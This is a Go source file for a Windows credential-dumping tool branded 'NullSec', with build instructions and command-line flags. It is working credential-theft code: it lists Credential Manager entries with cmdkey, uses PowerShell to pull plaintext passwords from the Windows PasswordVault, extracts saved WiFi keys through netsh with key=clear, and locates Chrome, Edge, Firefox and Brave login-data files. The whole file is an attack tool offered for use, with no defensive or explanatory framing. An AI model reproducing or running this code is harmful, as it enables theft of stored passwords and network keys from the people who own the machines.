// NullSec Windows Credential Dumper
// Extract credentials from Windows Credential Manager
// Build: GOOS=windows go build -o nullsec-creds.exe creds_dump.go
package main

import (
	"flag"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
)

func banner() {
	fmt.Println(`
╔═══════════════════════════════════════╗
║   NullSec Credential Dumper - Win     ║
║   Fast Go-based credential extraction ║
╚═══════════════════════════════════════╝`)
}

type Credential struct {
	Target   string
	Type     string
	User     string
	Password string
}

func runCmd(name string, args ...string) string {
	cmd := exec.Command(name, args...)
	out, _ := cmd.CombinedOutput()
	return string(out)
}

func dumpCredentialManager() []Credential {
	var creds []Credential
	
	// Use cmdkey to list credentials
	out := runCmd("cmdkey", "/list")
	
	targetRe := regexp.MustCompile(`Target: (.+)`)
	typeRe := regexp.MustCompile(`Type: (.+)`)
	userRe := regexp.MustCompile(`User: (.+)`)
	
	targets := targetRe.FindAllStringSubmatch(out, -1)
	types := typeRe.FindAllStringSubmatch(out, -1)
	users := userRe.FindAllStringSubmatch(out, -1)
	
	for i := 0; i < len(targets); i++ {
		cred := Credential{
			Target: strings.TrimSpace(targets[i][1]),
		}
		if i < len(types) {
			cred.Type = strings.TrimSpace(types[i][1])
		}
		if i < len(users) {
			cred.User = strings.TrimSpace(users[i][1])
		}
		creds = append(creds, cred)
	}
	return creds
}

func dumpVaultCredentials() {
	fmt.Println("\n[*] Windows Vault Credentials:")
	out := runCmd("powershell", "-Command", 
		"[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];"+
		"$vault = New-Object Windows.Security.Credentials.PasswordVault;"+
		"$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ } | Select Resource,UserName,Password")
	fmt.Println(out)
}

func dumpWiFiPasswords() {
	fmt.Println("\n[*] WiFi Passwords:")
	
	// Get profile names
	out := runCmd("netsh", "wlan", "show", "profiles")
	profileRe := regexp.MustCompile(`All User Profile\s+:\s+(.+)`)
	profiles := profileRe.FindAllStringSubmatch(out, -1)
	
	for _, p := range profiles {
		name := strings.TrimSpace(p[1])
		passOut := runCmd("netsh", "wlan", "show", "profile", name, "key=clear")
		
		keyRe := regexp.MustCompile(`Key Content\s+:\s+(.+)`)
		keys := keyRe.FindStringSubmatch(passOut)
		
		if len(keys) > 1 {
			fmt.Printf("    [%s] Password: %s\n", name, strings.TrimSpace(keys[1]))
		} else {
			fmt.Printf("    [%s] Password: <not found>\n", name)
		}
	}
}

func dumpBrowserCredentials() {
	fmt.Println("\n[*] Browser Credential Locations:")
	
	paths := []string{
		`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`,
		`%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`,
		`%APPDATA%\Mozilla\Firefox\Profiles`,
		`%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data`,
	}
	
	for _, path := range paths {
		expanded := runCmd("cmd", "/c", "echo", path)
		expanded = strings.TrimSpace(expanded)
		
		// Check if file exists
		check := runCmd("cmd", "/c", "if exist \""+expanded+"\" echo EXISTS")
		if strings.Contains(check, "EXISTS") {
			fmt.Printf("    [FOUND] %s\n", path)
		}
	}
}

func main() {
	banner()
	
	wifi := flag.Bool("wifi", false, "Dump WiFi passwords")
	browser := flag.Bool("browser", false, "Show browser credential locations")
	vault := flag.Bool("vault", false, "Dump Windows Vault (requires elevation)")
	all := flag.Bool("all", false, "Dump all credentials")
	flag.Parse()
	
	fmt.Println("\n[*] Credential Manager:")
	creds := dumpCredentialManager()
	for _, c := range creds {
		fmt.Printf("    [%s] %s -> %s\n", c.Type, c.Target, c.User)
	}
	fmt.Printf("\n[✓] Found %d credentials\n", len(creds))
	
	if *wifi || *all {
		dumpWiFiPasswords()
	}
	
	if *browser || *all {
		dumpBrowserCredentials()
	}
	
	if *vault || *all {
		dumpVaultCredentials()
	}
	
	if !*wifi && !*browser && !*vault && !*all {
		fmt.Println("\n[*] Use -wifi, -browser, -vault, or -all for more")
	}
}
